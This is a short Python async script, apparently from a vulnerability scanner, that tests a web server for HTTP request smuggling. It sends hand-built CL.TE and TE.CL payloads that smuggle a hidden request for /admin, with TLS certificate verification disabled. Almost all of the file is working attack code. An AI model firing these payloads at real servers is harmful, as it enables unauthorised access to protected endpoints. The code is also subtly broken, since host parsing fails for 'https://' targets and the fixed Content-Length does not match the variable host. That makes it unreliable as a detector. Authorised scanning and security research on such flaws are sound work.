import asyncio
import ssl


async def smuggling_check(target: str) -> dict:
    host = target.split(":")[0]
    is_https = target.startswith("https")
    port = 443 if is_https else 80

    cl_te = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 44\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /admin HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "\r\n"
    )

    te_cl = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "5c\r\n"
        "GET /admin HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 15\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
    )

    results = []
    for name, payload in [("CL.TE", cl_te), ("TE.CL", te_cl)]:
        try:
            ctx = ssl.create_default_context() if is_https else None
            if ctx:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            r, w = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx), timeout=10)
            w.write(payload.encode())
            await w.drain()
            resp = b""
            try:
                while True:
                    chunk = await asyncio.wait_for(r.read(4096), timeout=5)
                    if not chunk:
                        break
                    resp += chunk
            except asyncio.TimeoutError:
                pass
            w.close()
            text = resp.decode(errors="replace")
            vulnerable = "HTTP/1.1 200" in text and ("admin" in text.lower() or "welcome" in text.lower())
            results.append({"type": name, "vulnerable": vulnerable, "evidence": text[:200] if vulnerable else "No evidence"})
        except Exception as e:
            results.append({"type": name, "vulnerable": False, "error": str(e)})

    return {"target": host, "port": port, "smuggling_vulnerable": any(r.get("vulnerable") for r in results), "tests": results}
